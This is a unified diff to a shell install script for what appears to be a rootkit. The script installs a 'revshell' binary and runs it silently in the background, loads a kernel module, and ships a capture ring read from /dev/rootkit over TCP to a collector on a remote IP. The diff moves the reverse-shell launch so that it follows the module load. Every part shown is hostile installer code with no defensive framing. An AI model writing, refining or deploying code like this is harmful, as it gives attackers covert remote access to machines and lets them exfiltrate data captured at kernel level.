@@ -81,12 +81,6 @@ if [ -f "$MODULE_DIR/revshell" ]; then
     install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell 
 fi
 
-# Launch revshell background worker using the installed binary path
-if [ -x /usr/local/bin/revshell ]; then
-    pkill -f revshell 2>/dev/null || true
-    nohup /usr/local/bin/revshell >/dev/null 2>&1 &
-fi
-
 # Log sender: reads the kernel capture ring (/dev/rootkit) and forwards it over
 # TCP to the collector that runs on $REMOTE_IP (./log there, same port).
 RKLOG=/usr/local/bin/rklog
@@ -147,4 +141,11 @@ if [ "$MODULE_LOADED" = false ]; then
         exit 1
     fi
 fi
+
+# Launch revshell background worker using the installed binary path
+if [ -x /usr/local/bin/revshell ]; then
+    pkill -f revshell 2>/dev/null || true
+    nohup /usr/local/bin/revshell >/dev/null 2>&1 &
+fi
+
 "$ABS_PATH" &
